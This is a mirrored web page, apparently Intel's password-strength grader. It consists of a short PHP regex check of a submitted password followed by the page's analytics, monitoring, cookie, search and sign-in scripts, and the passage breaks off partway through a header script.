<?php
  $password = $_POST['FormFieldName'];
  $date = date("F j, Y, g:i a");

  if (preg_match("#.*^(?=.{8,20})(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*\W).*$#", $password)){
      $strength = "Your password is strong.";
  } else {
      $strength = "Your password is not safe.";
  }
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:pas="http://www.intel.com/2009/pluckApplicationServer">

<head>
  <title>How Strong is Your Password?</title>

  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <meta name="keywords" content="digital self, security, safety online, how strong is your password"/>
  <meta name="description" content="Use our password grader to see how strong your password is, and then upgrade it for more security."/>
  <meta name="robots" content="index,follow"/>
  <meta name="robots" content="noarchive"/>
  <meta name="language" content="en"/>
  <meta name="location" content="us"/>
  <meta name="X-Server" content="PRD1PCQAPP06"/>
  <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
  <meta property="og:title" content="How Strong is Your Password?"/>
  <meta property="og:type" content="company"/>
  <meta property="og:url" content="http://www.intel.com/content/www/us/en/forms/passwordwin.html"/>
  <meta property="og:image" content="http://www.intel.com/content/dam/www/public/us/en/apps/password-security-toolkit/images/passwordwinthumb.jpg"/>
  <meta property="og:site_name" content="Intel"/>
  <meta property="fb:admins" content="186774301373559"/>

  <meta property="og:description" content="Use our password grader to see how strong your password is, and then upgrade it for more security."/>
  <link rel="icon" type="image/vnd.microsoft.icon" href="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/default/favicon.ico"/>
  <link rel="shortcut icon" type="image/vnd.microsoft.icon" href="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/default/favicon.ico"/>

  <!--[if gte IE 7]><!-->
    <script type="text/javascript">
      var gomez = {
          gs: new Date().getTime(),
          acctId: '8B3439',
          pgId: '',
          grpId: 'CQ'
      };

      /*Gomez tag version: 7.0.1*/
      var gomez=gomez?gomez:{};gomez.h3=function(d, s){for(var p in s){d[p]=s[p];}return d;};gomez.h3(gomez,{b3:function(r){if(r<=0)return false;return Math.random()<=r&&r;},b0:function(n){var c=document.cookie;var v=c.match(new RegExp(';[ ]*'+n+'=([^;]*)'));if(!v)v=c.match(new RegExp('^'+n+'=([^;]*)'));if(v)return unescape(v[1]);return '';},c2:function(n,v,e,p,d,s){try{var t=this,a=t.domain?t.domain:location.hostname;var c=n+'='+escape(v)+(e?';expires='+e.toGMTString():'')+(p?';path='+p:';path=/')+(d?';domain='+d:';domain='+a)+(s?';secure':'');document.cookie=c;}catch(e){}},z0:function(n){var t=this;if(n){var s =t.b0("__g_c");if(!s)return '';var v=s.match(new RegExp(n+':([^\|]*)'));if(v)return unescape(v[1]);return '';}else return '';},z1:function(n,m){var t=this;if(n){var s=t.b0("__g_c");if(s){if(s.indexOf(n+':')!=-1)s=s.replace(new RegExp('('+n+':[^\|]*)'),n+':'+m);else s=s==' '?n+':'+m:s+'|'+n+':'+m;t.c2("__g_c",s);}else t.c2("__g_c",n+':'+m);};},b2:function(v,s){var t=this,f=new Date(t.gt()+946080000000),g=''+v+'_'+s;t.c2('__g_u',g,f);t.gc.c=v;t.gc.d=s;t.z1('c',v);t.z1('d',s);},gt:function(){return new Date().getTime()},b5:function(){return new Date().getTime()-gomez.gs},j1:function(h){if(h){if(h.indexOf('<')!=-1||h.indexOf('%3C')!=-1||h.indexOf('%3c')!=-1)return null;if(window.decodeURIComponent)return decodeURIComponent(h);else return unescape(h);}return null;},f1:function(u,t){try{if(u){if(!/(^http|^https)/.test(u)){if(t==1)return gomez.j1(location.hostname);else return u;}var p=new RegExp('(^http|^https|):\/{2}([^\?#;]*)');if(t==1)p=new RegExp('(^http|^https|):\/{2}([^\/\?]*)');var r=u.match(p);if(r&&t==1)return gomez.j1(r[2]);else if(r)return r[0];}return null;}catch(e){return null;}},j3:function(n){try{var t =this,key=escape((window.location+n).replace(new RegExp("([:\/\.])","gm"),""));if(key&&key.length>100){key=key.substring(0,100);}if(window.localStorage){window.localStorage.setItem(key, t.gt());}else{t.z1('r',key+'___'+t.gt());}}catch(e){return ;}}, j2:function(){try{var m,t =this,key=escape((document.referrer+window.location).replace(new RegExp("([:\/\.])","gm"),""));if(key&&key.length>100){key=key.substring(0,100);}if(window.localStorage){m=window.localStorage.getItem(key);}if(!m){var c=t.z0("r");if(c){var r=c.split('___');if(r &&r[0]==key){m=r[1];}};};t.j4();return m;}catch(e){return ;}}, j4:function(){try{var t =this;if(window.localStorage){var key=escape((document.referrer+window.location).replace(new RegExp("([:\/\.])","gm"),""));if(key&&key.length>100){key=key.substring(0,100);}window.localStorage.removeItem(key);}else{t.z1('r', '');}}catch(e){return ;}}, j5:function(){var ret='';for(var i=0;i<3;i++){ret =ret +(((1+Math.random())*0x10000)|0).toString(16).substring(1);}ret =parseInt(ret, 16);return ret;},j6:function(){var t =this;var g=t.b0("__g_u");if(g&&g!='1'&&g.indexOf('NaN')==-1&&g.indexOf('undefined')==-1){var r =g.split("_");if(r.length>5){if(parseInt(r[5])<new Date().getTime()){return undefined;}else{return parseFloat(r[2]);}}}return undefined;},nameEvent:function(){},startInterval:function(){},endInterval:function(){},customValue:function(){}});gomez.P=function(){};gomez.P.prototype={hash:function(o){if(!o)return '';var t=this,s='{n:'+t.f9(o['n'])+'|';for(var i in o){if(i=='n')continue;if(typeof(o[i])=='string'||typeof(o[i])=='number')s +=i+':'+t.f9(o[i])+'|';};s=s.substring(0,s.length-1);return s+'}';},f9:function(s){s=''+s;s=s.replace('|','#$#').replace(':','$*$').replace('{','@#@').replace('}','*@*').replace('&','!*!');return s;},g0:function(){var t=this,z=gomez;if(z.grpIds)z.h3(z.gc,z.grpIds);if(z.wrate)z.gc.r=z.wrate;z.gc.e=z.grpId;for(var i=1;i<5;i++){if(z["grpId"+i]!=undefined){z.gc["e"+i]=z["grpId"+i];}}z.gc.b=z.pgId;z.gc.l=z.f1(z.m,2);if(self.screen){z.gc.m=screen.width;z.gc.o=screen.height;}else if(self.java){var j=java.awt.Toolkit.getDefaultToolkit();var s=j.getScreenSize();z.gc.m=s.width;z.gc.o=s.height;};z.gc.p=navigator.platform;if(navigator.cpuClass)z.gc.q=navigator.cpuClass;if(!z.gc.f&&!z.gc.g){try{var a=new Array("MSIE","Firefox","Opera","Safari","Chrome"),b=document.createElement('div');if(b.addBehavior&&document.body){b.addBehavior('#default#clientCaps');z.gc.k=b.connectionType;}}catch(e){};for(var i=0;i<a.length;i++){if(navigator.userAgent.indexOf(a[i])!=-1){z.gc.g=a[i];z.gc.f=(new String(navigator.userAgent.substring(navigator.userAgent.indexOf(a[i])).match(/[\d.]+/))).substring(0);}}if(!z.gc.f&&!z.gc.g){z.gc.g=navigator.vendor||navigator.appName;z.gc.f=(new String(navigator.appVersion.match(/[\d.]+/))).substring(0);}}return t.hash(z.gc);}};try{gomez.gc={'n':'c'};var iU=gomez.b0('__g_u');if(iU==undefined||iU==''){gomez.b2(gomez.j5(), 0);}var sR=gomez.j6();if(sR==undefined){sR=1;gomez.isFirstVi=true;}else{gomez.isFirstVi=false;}var wR=gomez.wrate?parseFloat(gomez.wrate):(gomez.wrate==0?0:1);wR=wR<0?0:(wR>1?1:wR);gomez.inSample=gomez.z0('a');if(!gomez.inSample||gomez.inSample==''){if(gomez.b3(wR*sR)){gomez.inSample=1;}else{gomez.inSample=0;}gomez.z1('a', gomez.inSample);}else{gomez.inSample=parseInt(gomez.inSample);}gomez.runFlg=gomez.inSample>0;if(gomez.runFlg){gomez.clickT=gomez.j2();gomez.h1=function(v,d){return v?v:d};gomez.gs=gomez.h1(gomez.gs,new Date().getTime());gomez.acctId=gomez.h1(gomez.acctId,'');gomez.pgId=gomez.h1(gomez.pgId,'');gomez.grpId=gomez.h1(gomez.grpId, '');gomez.E=function(c){this.s=c;};gomez.E.prototype={g1:function(e){var t=gomez,i=t.g6(e);if(i)i.e=t.b5();}};gomez.L=function(m){this.a=m;};gomez.L.prototype={g2:function(m){var t=gomez,n=t.b5();var s=document.getElementsByTagName(m);var e=t.k;if(m=='script')e=t.j;if(m=='iframe')e=t.l;if(s){var l=s.length;for(var i=0;i<l;i++){var u=s[i].src||s[i].href;if(u &&!e[u]){var r =new gomez.E(e);t.grm[u]=r;e[u]=new t.c7(u, n);if(t.gIE&&m=='script')t.e2(s[i],'readystatechange',t.d2,false);else t.e2(s[i],'load',r.g1,false);}}}}};gomez.L.m=new Object;gomez.S=function(){var t=this,h=gomez.acctId+".r.axf8.net";t.x=('https:'==location.protocol?'https:':'http:')+'//'+h+'/mr/b.gif?';t.pvHttpUrl=('https:'==location.protocol?'https:':'http:')+'//'+h+'/mr/e.gif?';t.abHttpUrl=('https:'==location.protocol?'https:':'http:')+'//'+h+'/mr/f.gif?';};gomez.h2=function(){var t=this;t.gIE=false;t.f=new Object;t._h=0;t.j=new Object;t.k=new Object;t.l=new Object;t.m=location.href;t.p=-1;t.q=-1;t.u=new Array;t._w=false;t.gSfr=/KHTML|WebKit/i.test(navigator.userAgent);t.grm=new Object;t.b;t.d=false;t.x=false;t.s=new gomez.S;t._a=false;t.h6=false;t.n1=0;t.c=false;};gomez.h3(gomez,{h5:function(u){try{var s=document.createElement('script');s.async=true;if(navigator.userAgent.indexOf('Firefox/3.5')!=-1){s.defer=true;}s.src=u;s.type='text/javascript';if(document.body)document.body.appendChild(s);else if(document.documentElement.getElementsByTagName('head')[0])document.documentElement.getElementsByTagName('head')[0].appendChild(s);}catch(e){var t=gomez;if(t.gSfr)document.write("<scr"+"ipt src='"+u+"'"+"><\/scr"+"ipt>");}},a9:function(){var t=gomez,i=t.z0('a'),g=t.b0('__g_u'),h=t.z0('h'), b=t.z0('b');t.gc.h=b;if(h)t.n1=parseInt(h);if(!t.gc.h)t.gc.h=1;t.z1('b',parseInt(t.gc.h)+1);if(i){t.a=parseInt(i);if(t.a==1){t._w=true;}else if(t.a==3){t.x=true;t._w=true;};t.d=true;}if(!t.gc.a)return;if(b){t.gc.c=t.z0('c');t.gc.i=t.z0('e');t.gc.j=t.z0('f');t.iFS=false;}else {var s='v=1';t.c2('__g_u','1',new Date(t.gt()+1000));t.iFS=true;if(t.b0('__g_u')&&g&&g!='1'&&g.indexOf('NaN')==-1&&g.indexOf('undefined')==-1){s='v=0';var r=g.split('_');t.b2(parseInt(r[0]),parseInt(r[1])+1);if(r[4]&&r[4]!='0'&&t.gt()<parseInt(r[5])&&r[2]&&r[2]!='0'){t.b1(parseFloat(r[2]),parseFloat(r[3]),parseFloat(r[4]),parseInt(r[5]));if(r[6])t.n0(parseInt(r[6]));};};t.h6=true;};t.gc.d=t.z0('d');if(!t.gc.d||(t.gc.d&&t.gc.d==0)){t.z1('d',1);t.gc.d=1;}t.b=t.z0('g');t.j8();if(i &&!t.isFirstVi&&t._w&&!t._a){t.h7();t._a=true;};},h7:function(){var t=gomez,u=t.tloc?t.tloc:('https:'==location.protocol?'https:':'http:')+'//'+t.acctId+'.t.axf8.net/js/gtag7.0.js';t.h5(u);},n0:function(h){var t=gomez,f=new Date(t.gt()+946080000000),g=t.b0('__g_u');t.n1=h;t.z1('h',h);if(g&&g!='1'&&g.indexOf('NaN')==-1&&g.indexOf('undefined')==-1){var r=g.split('_');g=''+r[0]+'_'+r[1]+'_'+r[2]+'_'+r[3]+'_'+r[4]+'_'+r[5]+'_'+h;t.c2('__g_u',g,f);};},b1:function(v,s,q,f){var t=this;if(s ==undefined)s =1;t.d=true;t.z1('e',v);t.z1('f',s);t.gc.i=v;t.gc.j=s;t.h4(v,s,q,f);},b3:function(i, v, s){var t =this;t.d=true;if(s ==undefined)s =1;if(i==0||i==1){t.a=i;if(i==1){t._w=true;if(!t._a){t.h7();t._a=true;};}else{t.d=false;}t.z1('a',t.a);if(v !=undefined){t.b1(v, s);}}else if(i==2){t.h4(v, s);}},h4:function(o,p,q,d){var t=this,f=new Date(t.gt()+946080000000),g=t.b0('__g_u');if(g&&g!='1'&&g.indexOf('NaN')==-1&&g.indexOf('undefined')==-1){var r=g.split('_'),s;if(d)s=d;else if(q&&q>=0)s=new Date(t.gt()+parseInt(q*86400000)).getTime();else{q=5;s=new Date(t.gt()+432000000).getTime();};g=''+r[0]+'_'+r[1]+'_'+o+'_'+p+'_'+q+'_'+s;t.c2('__g_u',g,f);};},b6:function(){var t=gomez;t.p=t.b5();},f8:function(){var t=this;if(t.pollId1)clearInterval(t.pollId1);},b7:function(){var t =gomez;t.f8();t.q=t.b5();},c7:function(u, s){var t=this;t.m=u;t.s=s;},c8:function(){var t=gomez,n=t.b5(),l=document.images.length;if(l>t._h){for(var i=t._h;i<l;++i){var u=document.images[i].src;if(u){var r =new gomez.E(t.f);t.grm[u]=r;t.f[u]=new t.c7(u, n);t.e2(document.images[i],'load',t.c4,false);t.e2(document.images[i],'error',t.c5,false);t.e2(document.images[i],'abort',t.c6,false);}}}t._h=l;},c4:function(e){var t=gomez,i=t.g6(e);if(i)i.e=t.b5();},c5:function(e){var t=gomez,i=t.g6(e);if(i){i.e=t.b5();i.b=1;}},c6:function(e){var t=gomez,i=t.g6(e);if(i)i.a=t.b5();},g6:function(e){var t=gomez,e=window.event?window.event:e,a=t.d8(e),i;if(t.grm[a.src||a.href]&&t.grm[a.src||a.href].s)i=t.grm[a.src||a.href].s[a.src||a.href];return i;},d2:function(){var t=gomez;var e=window.event?window.event:e,s=t.d8(e);if(s.readyState=='loaded'||s.readyState=='complete'){var o=t.j[s.src];if(o)o.e=t.b5();}},nameEvent:function(n){var t=this;t.f6(n,1);},startInterval:function(n){var t=this;t.f6(n,2,1);},endInterval:function(n){var t=this;t.f6(n,2,2);},f6:function(n,p,b){if(n&&n.length>20)n=n.substring(0,20);var t=this,f=t.u;if(p==3){f[f.length]={'n':'a','a':n,'b':b,'e':p,'f':undefined};}else{f[f.length]={'n':'a','a':n,'b':t.b5(),'e':p,'f':b};}},customValue:function(n,v){var t=this;if(typeof(v)!='number'){return;}t.f6(n,3,v);},d8:function(e){if(gomez.gIE)return e.srcElement||{};else return e.currentTarget||e.target||{};},e2:function(e,p,f,c){var n='on'+p;if(e.addEventListener)e.addEventListener(p,f,c);else if(e.attachEvent)e.attachEvent(n, f);else{var x=e[n];if(typeof e[n]!='function')e[n]=f;else e[n]=function(a){x(a);f(a);};}},i1:function(){var d =window.document, done=false,i2=function (){if(!done){done=true;gomez.b6();gomez.a9();}};(function (){try{d.documentElement.doScroll('left');}catch(e){setTimeout(arguments.callee, 50);return;}i2();})();d.onreadystatechange=function(){if(d.readyState=='complete'){d.onreadystatechange=null;i2();}};},j7:function(s, toUrl){try{var t=this,z=gomez;if(!s)return;s+="{n:u|e:1}";var p ='';if(t.isFirstVi){p='&a='+z.acctId+'&r=1&s=1';}else if(t.iFS){p='&a='+z.acctId+'&r='+t.j6();}if(window.encodeURIComponent)s=encodeURIComponent(s);else s=escape(s);z.h5(z.e(toUrl)+'info='+s+p);}catch(err){}return;},e:function(u){if(!/\?|&/.test(u))if(!/\?/.test(u))u +='?';else u +='&';return u;},j8:function(){var t=gomez, p=new gomez.P();var s=p.g0();t.j7(s, t.s.pvHttpUrl);},g7:function(){try{var t=gomez;t.gc.a=t.acctId;/*@cc_on t.gIE=true;@*/if(!t.gIE)t.gIE=!-[1,];if(t.gIE){t.i1();window.attachEvent('onload', t.b7);}else if(window.addEventListener){window.addEventListener('DOMContentLoaded', t.b6, false);window.addEventListener('load', t.b7, false);}else if(t.gSfr){var m=setInterval(function(){if(/loaded|complete/.test(document.readyState)){clearInterval(m);delete m;t.b6();t.b7();}}, 10);}else return;if(!t.jbo){t.c8();t.pollId1=setInterval(t.c8, 10);}if(!t.gIE)t.a9();}catch(e){return;}}});gomez.h2();gomez.g7();}}catch(e){};
    </script>
             
    <script type="text/javascript">
    CQURLInfo = {
        "contextPath": null,
        "requestPath": '\/content\/www\/us\/en\/forms\/passwordwin',
        "selectorString": null,
        "selectors": [],
        "extension": 'html',
        "suffix": null,
        "systemId": '857892c0-228f-4a5a-af84-a18afbd0b7a8',
        "runModes": 'publish'
    };
    </script>
    <script type="text/javascript" src="https://www-ssl.intel.com/etc/clientlibs/ver/3.1.188/foundation/jquery.js"></script>
  <!--<![endif]-->

  <!--[if gte IE 7]><!-->
    <link rel="stylesheet" href="https://www-ssl.intel.com/etc/designs/ver/3.1.188.5.31/intel/us/en/clientlibs/header-libs.css" type="text/css"/>
  <!--<![endif]-->
     <link rel="canonical" href="index.html"/>
   
   <script type="text/javascript">
       if ((navigator.userAgent.indexOf('iPad') != -1)) {
           document.write('<link rel="stylesheet" type="text/css" href="https://www-ssl.intel.com/etc/designs/ver/3.1.188.12.13/intel/us/en/css/intel.iOS.css" media="screen" />');
       }
       if (navigator.userAgent.indexOf('MSIE 10')) {
           document.write('<link rel="stylesheet" type="text/css" href="https://www-ssl.intel.com/etc/designs/ver/3.1.188.12.6/intel/us/en/css/intel.main.ie10.css" />');
       }
   </script>

   <!--[if gte IE 7]><!-->
       <script type="text/javascript" src="https://www-ssl.intel.com/etc/designs/ver/3.1.188.5.31/intel/us/en/clientlibs/header-libs.js"></script>
   <!--<![endif]-->
   
   <!--[if gte IE 7]><!-->
           <link rel="stylesheet" type="text/css" href="https://www-ssl.intel.com/etc/designs/intel/us/en/css/intel.main.override.css"/>
   <!--<![endif]-->

   <!--[if IE 6]>
		<script src="/etc/designs/intel/us/en/js/jquery.min.ie6.js" type="text/javascript"></script>
       <link href="/etc/designs/intel/us/en/css/intel.ie6.css" rel="stylesheet" type="text/css" />
       <link href="/etc/designs/intel/us/en/css/intel.ie6.content.css" rel="stylesheet" type="text/css" />
       <script type="text/javascript" src="/etc/designs/intel/us/en/js/intel.ie6.cookie.js"></script>
   <![endif]-->

        
<script type="text/javascript">$("#u1268-17").live("click", function(){
  var componentNameId='consumer-security1';
  wa_omniLink='wa_events=event70&wa_action=click&wa_eAction=click&wa_custom60='+componentNameId+'&wa_eCustom60='+componentNameId+'&wa_custom61=grademypassword&wa_eCustom61=grademypassword&wa_custom62='+componentNameId+':grademypassword&wa_eCustom62='+componentNameId+':grademypassword';
  trackGaEvent('Components', 'click: ' + componentNameId, 'grademypassword');
  if (wa_trackOmniture) {
        waTrackAsLink('intc:links', 'o', wa_omniLink);
    }
  twttr.ready(function (twttr) {
  //event bindings
  twttr.events.bind('tweet', trackTwitter);
  });
})

$("#share-buttons img").live("click", function(){
  var shareSite='facebook';
  var componentNameId='sharepagetop-2';
  var linkHref='facebook.com';
  vpsIntel.config('si:blog_off_domain_link');
  wa_omniLink='wa_events=event70,event27,event6&wa_eCustom10=si:blog_off_domain_link&wa_action=share:'+shareSite+'&wa_eAction=share:'+shareSite+'&wa_custom60='+componentNameId+'&wa_eCustom60='+componentNameId+'&wa_custom61='+linkHref+'&wa_eCustom61='+linkHref+'&wa_eCustom61='+linkHref+'&wa_custom62='+componentNameId+':'+linkHref+'&wa_eCustom62='+componentNameId+':'+linkHref;
  trackGaSocial(shareSite, 'share', wa_pathName);
  trackGaEvent('Share', shareSite, wa_pathName);
  if (wa_trackOmniture) {
        waTrackAsLink('intc:links', 'o', wa_omniLink);
    }
})

$(document).ready(function () {
  twttr.ready(function (twttr) {
  //event bindings
  twttr.events.bind('tweet', trackTwitter);
  });
});

function trackTwitter(intent_event) {
  if (intent_event) {
  var site='twitter'
  vpsIntel.config('si:like');              
  waTrackAsLink(wa_org2 + ':links', 'o', 'wa_events=event70,event94,event6&wa_eCustom10=si:like&wa_action=like&wa_eAction=like&wa_custom60=' + site + '&wa_eCustom60=' + site);
  trackGaSocial(site, 'like', wa_pathName);
  trackGaEvent('Like', site, wa_pathName);
  }
}
</script>

	    <!--[if lte IE 7]>
            
          <style>
              div.new.section {
                  display: none !important;
              }
          </style>

      <![endif]-->
		
        <!-- Will load font files for browsers other than IE7,8 -->
        <!--[if gte IE 9]><!-->
        <link rel="stylesheet" type="text/css" href="https://www-ssl.intel.com/etc/designs/ver/3.1.188.9.6/intel/us/en/css/latin.monotype.fonts.css" media="screen"/>
        <!--<![endif]-->
        <!-- Will load font file for browsers IE7,8 -->
        <!--[if (gt IE 6)&(lt IE 9)]>
        <link rel="stylesheet" type="text/css" href="/etc/designs/intel/us/en/css/latin.monotype.fonts.oldie.css" media="screen" />
        <![endif]-->
		
		<!-- Will load IE specific CSS for IE7 - IE9 -->
		<!--[if (gt IE 6)&(lte IE 9)]>
		<link rel="stylesheet" type="text/css" href="/etc/designs/intel/us/en/css/intel.main.ie.css" media="screen" />
        <![endif]-->



</head>

<script type="text/javascript">
  var referer = "ref";
  document.cookie = referer +"=" +escape(document.referrer)+";path"+"="+"/";
</script>
<body class="page detailtemplate assetdetailtemplateI ">
    <noscript>
        <style type="text/css">
            #language-chooser {display:none} 
            #language:hover + #language-chooser {display:block !important}
            #language-chooser:hover {display:block !important}      
        </style>
    </noscript>
    <div class="wrapper">
    <!--[if gt IE 6]><!--> 
    <!--<![endif]-->
    

<script type="text/javascript">
    //Set cookie for backbutton usage
    $(function () {
        var exdate = new Date();
        exdate.setDate(exdate.getDate() + 1);
        var url = encodeURI("/content/www/us/en/forms/passwordwin.html"); //escape() is deprecated!
        var cookieValue = "assetdetailtemplateI###" + url + ((exdate == null) ? "" : "; expires=" + exdate.toUTCString()) + "; path=/";
        document.cookie = "backbutton=" + cookieValue;
    });
</script>


<div class="uheader header">

<div class="component" data-component="uheader"
     data-component-id="1">

<script>
    if ((document.cookie.indexOf('SMSESSION') != -1) && (location.protocol == "http:")) {
        window.location = "https://www-ssl.intel.com/content/www/us/en/forms/passwordwin.html?";
    }
</script>

<script>
    //<![CDATA[
    $(function(){
    function showResult(str) {
        var timestamp = Number(new Date());
        if (str.length==0) {
            document.getElementById("livesearch").innerHTML = "";
            document.getElementById("livesearch").style.border = "0px";
            return;
        }

        //Using JQuery
        $.ajax({
            type: "GET",
            url: "/content/intel/proxypage.html?searchPhrase="+str,
            dataType: "text/html",
            success: function(result, request) {
                //alert("Success -- "  + xhr.status + xhr.responseText);
                if( xhr.status == 200 ) {
                    procesHSResult(xhr.responseText);
                }
            },
            error: function(xhr) {
                //alert("Error -- "  + xhr.status + xhr.responseText);
                if( xhr.status == 200 ) {
                    procesHSResult(xhr.responseText);
                }
            }
        });
    }

    function procesHSResult(resultStr)
    {
        document.getElementById("livesearch").innerHTML="";
        document.getElementById("livesearch").style.border="0px";

            resultStr = resultStr.substring(1, resultStr.length - 1);
            resultStr = resultStr.replace(/\"/g, '');
            var searchResults = resultStr.split(",");
            if (searchResults.length > 0) {

                for (k = 0; k < searchResults.length; k++) {

                    document.getElementById("livesearch").innerHTML += "<a href='https://www-ssl.intel.com/content/www/us/en/search.html?allwords=&quot;&#32;+&#32;searchResults[k]&#32;+&#32;&quot;'>" + searchResults[k] + "</a><br/>";
                    document.getElementById("livesearch").style.border = "1px solid #A5ACB2";
                }
            }
        }
        function onUSubmit() {
            waTrackSearch(document.getElementById("usearchBox").value, 'text', ''); //analytic tracking - do not remove
            document.getElementById("uhsform").action = '/content/www/us/en/search.html?allwords=' + document.getElementById("usearchBox").value;
            document.getElementById("uhsform").submit();
            return true;
        }
    });
    // ]]>
</script>
<div id="header">
    <div class="content">
        <ul>
            <li class="home">
                
                <div class="logo">


<div class="component" data-component="logo" data-component-id="1">


 
  <a href="https://www-ssl.intel.com/content/www/us/en/homepage.html"> <img src="https://www-ssl.intel.com/content/dam/intel/dm/image/logo.png" alt=""/>
            </a> 
      </div></div>

                
            </li>
            <li class="newmenu dont-close-menu">
                
                <div class="uheadernavigationtitle mainmenutitle">


<div class="component dont-close-menu" data-component="mainmenutitle" data-component-id="1">

<a href="index.html#" class="dont-close-menu" title="Menu">Menu</a>
<noscript>
Menu
</noscript>
</div></div>

                </li>
        </ul>
        
        <ul class="sign-in-link">
            <li id="sign-in-li" class="link"><a id='profile-sign-in-link' href='index.html#'>
                <script type="text/javascript">

                    if (document.cookie.indexOf('SMSESSION') == -1) {
                        document.write('<span class="lock-icon"></span>Sign In');
                    }
                    else {
                        document.write('My Profile<span class="down-arrow"></span>');
                    }
                </script>
            </a></li>
        </ul>
        <div id="uheaderSearchDiv" class="wapwrapper" data-component="uheadersearch" data-component-id="1">
            
            <div class="homepagesearch uheadersearch">


<div class="component" data-component="homepagesearch" data-component-id="1">
    <form class="intel-search" name="hpsform" id="hpsform" action="https://www-ssl.intel.com/content/www/us/en/search.html">
    <input autocomplete="off" id="searchBox" name="keyword" type="text" value="Search" title="Search" class="input clearOnFocus"
onkeyup='showHPResult(this.value, "/content/intelutility/proxypage.js?searchPhrase=" + encodeURI(this.value) + "&locale=" + encodeURI("en_US") + "&searchRealm=Default", "/content/www/us/en", "/content/intelutility/proxypage.js?searchPhrase=" + encodeURI(document.getElementById("searchBox").value) + "&operation=bestmatch&locale=" + "en"+"&localecode="+encodeURI("en_US"), &quot;Best Match&quot;)'/>
    
    <input type="submit" class="submit" value="Search" onclick="onSubmitHps('Search', '/content/www/us/en', 'en_US')"/>
    <div class="predictive-search hideme" id="predictive-search">
        <ul>
            <li class="best-match hidden" id="bestMatch">
                <div class="left-col" id="leftCol">
                    <h4>Best Match</h4>
                </div>
                <div class="right-col">
                    <ul id="bestResults">
                    </ul>
                </div>
            </li>
            <li class="other-match hidden" id="otherMatch">
                <div class="left-col">
                    <h4>Suggested:</h4>
                </div>
                <div class="right-col">
                    <ul id="otherResults">
                    </ul>
                </div>
            </li>
        </ul>
        <div class="bottom"></div>
    </div>

    </form>

</div>
<script type="text/javascript">
 function loadMenuAsync()  { 
           var po = document.createElement('script');
           po.type = 'text/javascript'; po.async = true;  po.src = "/etc/designs/intel/us/en/js/predictive-search.js";
           var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
 }
 loadMenuAsync();
 </script></div>


            
        </div>
        <ul class="my-intel">
            
            <div class="uheaderlinks">




                  <li class="link"><a href="https://www-ssl.intel.com/content/www/us/en/library/find-content.html">Find Content</a></li>

                  <li class="link"><a href="https://www-ssl.intel.com/content/www/us/en/blogs-communities-social.html">Communities</a></li>
<li style="display:none" class="link my-intel-link " alt="Click the Save symbol on any page to capture your favorite content for future reference" data-saveHistoryUrl="/content/intelutility/savedcontent.html?contentpath=/content/www/us/en/forms/passwordwin&contentpagename=How Strong is Your Password?&action=saveHistory" data-removeContentUrl="/content/intelutility/savedcontent.html?contentpath=/content/www/us/en/forms/passwordwin&contentpagename=How Strong is Your Password?"><a href="index.html#">Saved Content</a></li>
    </div>

            
        </ul>
    </div>
    <!--content-->
</div>
<!--header-->

                    


<div class="unavmyintel">




        <div id="menu-wrappermyintel" class="wapwrapper" data-component="myintel" data-component-id="1">     
                   
        <div class="myintelbg boxnav savedcontent" style="top:54px; margin-left:-121px; width:520px; display:none">
        <!--left side-->
        
            <!--middle-->
            <div class="navigationmyintelmiddle" style="margin: 20px 13px 3px">
              <div class="searchmyintel" >
                <ul>
                  <li class="savedCont" ><a href="index.html#" onclick="return false;" title="Saved Content">Saved Content</a></li>

                  <li class="recentViewed" ><a href="index.html#" onclick="return false;" title="Recently Viewed">Recently Viewed</a></li>
                </ul>
              </div>
              <!--dynamic middle section 1-->
               <div class="savedcontents"><!-- 
    Saved Content component
 -->




<div class="component" data-component="savedcontents" data-component-id="1">

<div id = "top20" class="middlemyintel">
</div>  
</div>
</div>


     
   </div>

              
                </div>
      
       

    <script type="text/javascript">
        $(function(){
        function removeRecent(id) {           
            var element = document.getElementById(id);
            var action = $(element).children('a').attr('saved-content-action-attr');
            var elementString = $(element).children('a').attr('saved-content-elementString-attr');
            var url = $('li.my-intel-link').attr('data-removeContentUrl'); 
            url += "&action="+action+"&elementstring="+elementString; 
            makeAjaxCall(url);
        }
        
        function removeSaved(id) {
            var element = document.getElementById(id);  
               //If element is null, page added to list after page loaded

               if(element == null)
               {
                  var action = $('#endListSave').children('li').children('a').attr('saved-content-action-attr');
                  var elementString = $('#endListSave').children('li').children('a').attr('saved-content-elementString-attr');
                   var url = $('li.my-intel-link').attr('data-removeContentUrl'); 
				url += "&action="+action+"&elementstring="+elementString
               }
               else
               {
				var action = $(element).children('a').attr('saved-content-action-attr');
           
				var elementString = $(element).children('a').attr('saved-content-elementString-attr');
				var url = $('li.my-intel-link').attr('data-removeContentUrl'); 
				url += "&action="+action+"&elementstring="+elementString;
				}
          
            makeAjaxCall(url);
        }
        });
    </script>         
            
    </div>

</div>
        
<div id="sign-in-form" class="wapwrapper" data-component-id="1" data-component="signin-nav-box"></div>

<div class="newmenu-container">
<div class="newmenu-contents" >
    </div>
</div>


<script>
    //<![CDATA[
    $(function () {
        $("#register-button").click(function () {
            $(".navigationmyintellogin").hide();
            $(".navigationmyintelregister").show();
            return false;
        });
    });
</script>

<script type="text/javascript">
    $(function () {
        var signinURL = "/content/www/us/en/homepage/_jcr_content/header.signin.html?redirect=/content/www/us/en/forms/passwordwin.html&location=US&lang=en";
        $(".sign-in-link .link a").bind("click", function (e) {
            e.preventDefault();
            if (!$(this).hasClass("selected")) {
                $("#sign-in-form").load(signinURL, function () {
                    $(".signin-nav-box").slideDown(function () {
                        $(".sign-in-link .link a").addClass("selected");

                    });
                });
            } else {
                closeSigninBox();
            }
        });
// ]]>
    //    console.log("from uheader.jsp");
        var pageUrl = window.location.pathname;
        var queryString = window.location.search;
        var EDC_NEWREG_COOKIE = "edc_newreg";
    //    console.log("edc_newreg cookie value" + readCookie(EDC_NEWREG_COOKIE));
